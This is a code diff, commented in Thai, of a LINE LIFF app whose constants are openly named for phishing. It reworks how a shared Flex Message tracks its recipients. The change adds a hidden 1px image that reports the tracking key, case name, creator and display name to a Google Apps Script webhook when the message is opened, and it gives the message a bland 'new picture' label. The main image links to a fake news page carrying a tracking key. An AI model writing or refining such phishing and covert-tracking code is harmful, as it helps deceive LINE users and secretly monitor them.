@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby1ADRKljk4ANBU9LDh5WnTqtm1LK15DL0-7N64Y9uZnIiESsl5SyqGd6UGSt39MiAiCg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxdE5pE-qrnOkQmvnRIedS_g25kwEXR6d8LIrNrhDgb8n_r1OajOG9wQjh5fkmgosPfQA/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,77 +820,55 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับ LINE official account เพื่อให้เป็น redirect proxy
-                // ป้องกันการโหลดระหว่าง preview โดยใช้ URI scheme ของ LINE
-                const lineScheme = "https://line.me/R/oaMessage/@lineofficial/?";
-                const tempId = Math.random().toString(36).substring(2, 10);
+                // สร้าง URL สำหรับ Zero Click tracking เมื่อผู้รับเปิดดูข้อความ
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง Zero Click Tracker URL ที่จะถูกเรียกเมื่อผู้รับเห็นข้อความ
-                // เพิ่ม parameter พิเศษเพื่อป้องกันการหลอก และระบุว่านี่คือการเรียกใช้จากผู้รับจริงๆ
-                const zeroClickUrl = `${PHISHING_WEBHOOK_URL}?` + 
-                                    `action=zeroClick` + 
-                                    `&key=${trackingKey}` + 
-                                    `&case=${encodeURIComponent(caseName)}` + 
-                                    `&creator=${encodeURIComponent(userId)}` + 
-                                    `&source=flexmsg` +  // บ่งชี้ที่มาจาก flex message
-                                    `&mode=receiver` +   // บ่งชี้ว่าเป็นผู้รับ
-                                    `&v=2.1` +           // เวอร์ชัน (เพื่อแยกจากเวอร์ชันเก่า)
-                                    `&tid=${tempId}`;    // ID ชั่วคราวป้องกันการแคช
+                // สร้าง URL พร้อมพารามิเตอร์ที่ระบุว่านี่คือการร้องขอจากผู้รับเป้าหมาย
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true&r=${randomSuffix}`;
                 
-                console.log("Zero Click URL:", zeroClickUrl);
-                
-                // สร้าง Flex Message ที่ปรับปรุงแล้ว - วิธีใหม่ที่ป้องกันไม่ให้ติดตามในขณะ preview
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
+
+                // สร้าง Flex Message ที่มีการติดตามการเปิดอ่านผ่านรูปภาพแบบซ่อน
                 const message = {
                     type: 'flex',
-                    altText: `${caseName}`, // ข้อความแจ้งเตือนที่แสดงในแชท (ใช้ชื่อเคส)
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        hero: {
+                        hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: {
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
-                                uri: clickTrackUrl // ลิงก์สำหรับคลิก
+                                uri: clickTrackUrl
                             }
                         },
-                        // ใช้เทคนิคพิเศษสำหรับ Zero Click tracking
+                        // เพิ่ม box ที่มองไม่เห็นเพื่อทำ zero-click tracking
                         footer: {
                             type: 'box',
                             layout: 'vertical',
-                            contents: [
-                                {
-                                    type: 'box',
-                                    layout: 'horizontal',
-                                    contents: [
-                                        {
-                                            type: 'text',
-                                            text: ' ', // ใช้ช่องว่างเพื่อไม่ให้เห็น
-                                            color: '#FFFFFF00', // โปร่งใส
-                                            size: 'xxs',
-                                            align: 'start',
-                                            action: {
-                                                type: 'uri',
-                                                uri: zeroClickUrl // URI ที่จะ track เมื่อเปิดดู
-                                            }
-                                        }
-                                    ],
-                                    paddingAll: '0px',
-                                    height: '1px',
-                                    margin: 'none',
-                                    spacing: 'none'
-                                }
-                            ],
-                            paddingAll: '0px',
-                            height: '1px',
-                            backgroundColor: '#FFFFFF00' // โปร่งใส
+                            contents: [{
+                                type: 'image',
+                                url: `${zeroClickTrackUrl}`,
+                                size: '1px', // รูปภาพขนาดเล็กมากจนมองไม่เห็น
+                                aspectMode: 'fit',
+                                aspectRatio: '1:1',
+                                flex: 0
+                            }],
+                            spacing: '0px',
+                            margin: 'none',
+                            height: '1px' // ซ่อน footer โดยตั้งความสูงให้น้อยมาก
                         }
                     }
                 };
 
                 console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
+
+                // ตัวแปรเพื่อตรวจสอบว่าแชร์สำเร็จหรือไม่
+                let shareSuccessful = false;
 
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     console.log("ShareTargetPicker is available. Calling now...");
@@ -899,8 +877,9 @@
 
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
+                        shareSuccessful = true;
                         
-                        // บันทึก Tracking Key Mapping ก่อน
+                        // บันทึก Tracking Key Mapping หลังแชร์สำเร็จ
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                             if (!saved) {
@@ -921,7 +900,7 @@
                 } else {
                     showStatus('ShareTargetPicker ไม่พร้อมใช้งาน', false);
                 }
-                
+                        
             } catch (error) {
                 console.error('Error in shareImage function:', error);
                 showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false);
